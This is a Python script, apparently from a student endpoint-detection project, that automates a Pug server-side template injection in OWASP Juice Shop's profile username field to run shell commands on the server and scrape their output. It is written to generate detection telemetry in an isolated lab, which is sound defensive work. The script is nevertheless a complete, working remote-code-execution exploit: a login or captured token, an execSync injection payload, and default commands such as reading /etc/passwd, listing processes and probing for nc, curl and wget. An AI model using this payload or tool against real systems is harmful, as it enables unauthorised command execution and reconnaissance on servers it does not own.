#!/usr/bin/env python3
"""
juiceshop_ssti_runner.py  -  Pug SSTI command runner for OWASP Juice Shop

PURPOSE
    ICT30016 EDR project. Automates the server-side template injection in the
    /profile username field (Pug `#{...}` interpolation) to run a list of
    benign commands on the Juice Shop server. Each command spawns a child
    process under node -> a distinct ProcessCreate/execve event for the EDR
    to detect. Use it to generate a spread of labelled RCE telemetry.

SCOPE / AUTHORISATION
    Isolated host-only lab only (your Juice Shop VM). Do not point this at
    anything you do not own and are not authorised to test.

MECHANISM
    - POST /profile  with  username=#{require('child_process').execSync("<cmd>")}
      stores the payload as the username (form-urlencoded, auth via token cookie).
    - GET /profile  renders the Pug template server-side, which is when
      execSync actually runs. Output is rendered into the page as the username.
    - Each command is wrapped in unique echo markers so output can be scraped
      out of the HTML without depending on the page markup.

    Ground truth for detection is the sensor telemetry, not the scraped output:
        sudo ausearch -k exec -ts recent
        sudo journalctl -t sysmon --since "5 min ago" | grep CommandLine

USAGE
    python3 juiceshop_ssti_runner.py --target http://juiceshop.test:3000 \
        --email basil@juice-sh.op --password <pw>

    python3 juiceshop_ssti_runner.py --target http://juiceshop.test:3000 \
        --token <captured_jwt> --cmd "id" --cmd "uname -a"

    python3 juiceshop_ssti_runner.py --target http://juiceshop.test:3000 \
        --email <e> --password <p> --cmdfile commands.txt
"""

import argparse
import re
import sys
import time
import uuid

try:
    import requests
except ImportError:
    sys.exit("Missing dependency: pip install requests")

RUN_ID = uuid.uuid4().hex[:8]
M_START = f"EDR{RUN_ID}START"
M_END = f"EDR{RUN_ID}END"

# Benign, telemetry-diverse defaults. Each spawns a different child under node,
# so the detector sees a range of process signatures rather than just `id`.
# Keep commands free of double-quotes (they'd break the JS string).
DEFAULT_CMDS = [
    "id",
    "whoami",
    "hostname",
    "uname -a",
    "cat /etc/passwd",
    "ps aux",
    "ls -la /home/juice/juice-shop",
    "which nc python3 curl wget",
    f"id; touch /tmp/edr_ssti_{RUN_ID}",
]


def get_token(base, args, session):
    """Return a JWT: use --token if given, else log in for a fresh one."""
    if args.token:
        print("[+] using supplied token")
        return args.token
    if not (args.email and args.password):
        sys.exit("[!] provide --token, or --email and --password to log in")

    r = session.post(f"{base}/rest/user/login",
                     json={"email": args.email, "password": args.password},
                     timeout=10)
    if r.status_code != 200:
        sys.exit(f"[!] login failed ({r.status_code}): {r.text[:200]}")
    token = r.json().get("authentication", {}).get("token")
    if not token:
        sys.exit("[!] no token in login response")
    print(f"[+] logged in as {args.email}")
    return token


def build_payload(cmd):
    """Wrap the command in echo markers so its output can be scraped back."""
    shell = f"echo {M_START};{cmd};echo {M_END}"
    return f'#{{require(\'child_process\').execSync("{shell}")}}'


def run_command(session, base, cmd):
    """Set the username to the SSTI payload, render the profile, scrape output."""
    payload = build_payload(cmd)
    print(f"\n=== cmd: {cmd} ===")

    t0 = time.perf_counter()
    # Store the payload as the username.
    session.post(f"{base}/profile", data={"username": payload},
                 timeout=30, allow_redirects=True)
    # Render the profile -> this executes execSync server-side.
    r = session.get(f"{base}/profile", timeout=30)
    elapsed = time.perf_counter() - t0

    print(f"    -> node spawned a shell running: /bin/sh -c \"{cmd}\"  "
          f"(HTTP {r.status_code}, {elapsed:.2f}s)")

    m = re.search(re.escape(M_START) + r"(.*?)" + re.escape(M_END), r.text, re.S)
    if m:
        out = m.group(1).strip()
        # `#{}` interpolation HTML-escapes, so undo the common entities for display.
        out = out.replace("&lt;", "<").replace("&gt;", ">").replace("&amp;", "&")
        for line in out.splitlines():
            print(f"       | {line}")
    else:
        print("       (no scraped output; check sensor telemetry for the execve)")


def reset_username(session, base):
    """Set username back to plain text so the profile page stops re-executing."""
    session.post(f"{base}/profile", data={"username": f"edrlab_{RUN_ID}"},
                 timeout=15, allow_redirects=True)
    print(f"\n[+] username reset to edrlab_{RUN_ID} (SSTI no longer re-fires on view)")


def main():
    ap = argparse.ArgumentParser(description="Juice Shop SSTI command runner (lab use only)")
    ap.add_argument("--target", required=True, help="Base URL, e.g. http://juiceshop.test:3000")
    ap.add_argument("--token", help="Captured JWT (skips login)")
    ap.add_argument("--email", help="Login email (if not using --token)")
    ap.add_argument("--password", help="Login password (if not using --token)")
    ap.add_argument("--cmd", action="append", default=[],
                    help="Command to run (repeatable). Overrides the default list.")
    ap.add_argument("--cmdfile", help="File with one command per line")
    ap.add_argument("--delay", type=float, default=1.0,
                    help="Seconds between commands (spaces out the telemetry)")
    ap.add_argument("--no-reset", action="store_true",
                    help="Leave the last payload set as the username")
    args = ap.parse_args()

    requests.packages.urllib3.disable_warnings()
    base = args.target.rstrip("/")

    commands = list(args.cmd)
    if args.cmdfile:
        with open(args.cmdfile) as f:
            commands += [ln.strip() for ln in f if ln.strip() and not ln.startswith("#")]
    if not commands:
        commands = DEFAULT_CMDS

    print(f"[*] run id: {RUN_ID}  (grep your logs / marker files for this)")
    print(f"[*] target: {base}   commands: {len(commands)}")

    session = requests.Session()
    session.verify = False
    token = get_token(base, args, session)
    # /profile authorises via the token cookie (per the captured request).
    session.cookies.set("token", token)
    session.headers.update({"Authorization": f"Bearer {token}"})

    for cmd in commands:
        run_command(session, base, cmd)
        time.sleep(args.delay)

    if not args.no_reset:
        reset_username(session, base)

    print("\n[*] correlate the telemetry:")
    print("    sudo ausearch -k exec -ts recent | grep -iE 'sh -c|dash'")
    print("    sudo journalctl -t sysmon --since '5 min ago' | grep -i CommandLine | grep -i node")
    print(f"    ls -la /tmp/edr_ssti_{RUN_ID}")


if __name__ == "__main__":
    main()
